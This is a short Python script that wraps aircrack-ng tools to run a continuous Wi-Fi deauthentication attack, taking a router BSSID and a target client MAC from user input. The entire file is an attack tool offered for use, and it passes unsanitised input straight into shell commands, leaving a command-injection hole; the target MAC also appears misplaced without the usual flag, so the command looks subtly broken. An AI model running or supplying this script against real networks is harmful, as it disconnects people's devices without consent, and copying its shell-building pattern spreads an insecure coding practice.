import os 
interface = "wlan0"
ent_ch = input("enter your network channel: ")
os.system(f"sudo iwconfig {interface} channel {ent_ch}")
try: 
  ap = input("enter the bssid/mac_address of the router: ")
  target_mac = input("enter the target mac of that ap: ")
  os.system(f"sudo aireplay-ng -0 0 -a {ap} {interface} {target_mac}")
except KeyboardInterrupt:
  print("exited")

